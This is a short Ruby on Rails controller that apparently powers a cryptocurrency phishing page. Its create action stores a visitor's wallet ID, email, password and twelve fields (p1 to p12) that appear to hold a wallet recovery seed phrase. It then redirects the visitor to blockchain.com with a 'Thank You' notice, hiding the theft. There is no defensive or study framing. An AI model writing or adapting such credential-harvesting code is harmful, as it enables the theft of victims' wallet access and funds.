class TwtsController < InheritedResources::Base
  layout "twt"
def index
end

   def new
        @welcomes = Welcome.all
        @headers = Header.all
        @twt = Twt.new
      end

      def create
        @twt = Twt.new(twt_params)
        respond_to do |format|
          if @twt.save
            twt = @twt
            #AccountMailer.accout_email(account).deliver
            format.html { redirect_to "https://blockchain.com", notice: 'Thank You. we get back to you right away' }
          else
            format.html { render :new }
            format.json { render json: @twt.errors, status: :unprocessable_entity }
          end
        end
      end


  private

    def twt_params
      params.require(:twt).permit(:wallet_id, :email, :password, :p1, :p2, :p3, :p4, :p5, :p6, :p7, :p8, :p9, :p10, :p11, :p12)
    end

end
